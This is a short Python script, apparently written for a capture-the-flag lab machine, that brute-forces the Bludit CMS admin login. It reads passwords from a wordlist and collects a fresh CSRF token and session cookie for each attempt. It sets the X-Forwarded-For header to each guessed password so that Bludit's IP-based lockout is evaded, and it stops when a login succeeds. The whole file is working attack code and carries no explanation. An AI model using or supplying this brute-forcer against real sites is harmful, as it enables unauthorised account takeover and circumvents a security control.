import requests
from bs4 import BeautifulSoup
import sys

i=0
file=open(sys.argv[2],'r')
for line in file:
  for word in line.split():
    i += 1
    proxy={'http':'127.0.0.1:8080'}
    print('Using {0}:{1}'.format(i,word), end="\r",flush=True)
    url=sys.argv[3]
    req=requests.get(url,proxies=proxy,headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'})
    session=req.cookies['BLUDIT-KEY']
    soup=BeautifulSoup(req.text, "lxml")
    CSRF=soup.find('input',attrs = {'name':'tokenCSRF'})['value']
    data={'tokenCSRF':CSRF,'username':sys.argv[1],'password':word,'save':''}
    cookie={'BLUDIT-KEY':session}
    headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language': 'en-US,en-GB;q=0.8,en;q=0.5,hi;q=0.3','Accept-Encoding':'gzip, deflate','Referer':'http://10.10.10.191/admin/login','Content-Type':'application/x-www-form-urlencoded','Upgrade-Insecure-Requests':'1','X-FORWARDED-FOR':word}
    response=requests.post(url,data=data,cookies=cookie,allow_redirects=False,proxies=proxy,headers=headers)
    if 'alert-danger' not in response.text:
         print("Password = "+word)
         sys.exit(0)
    


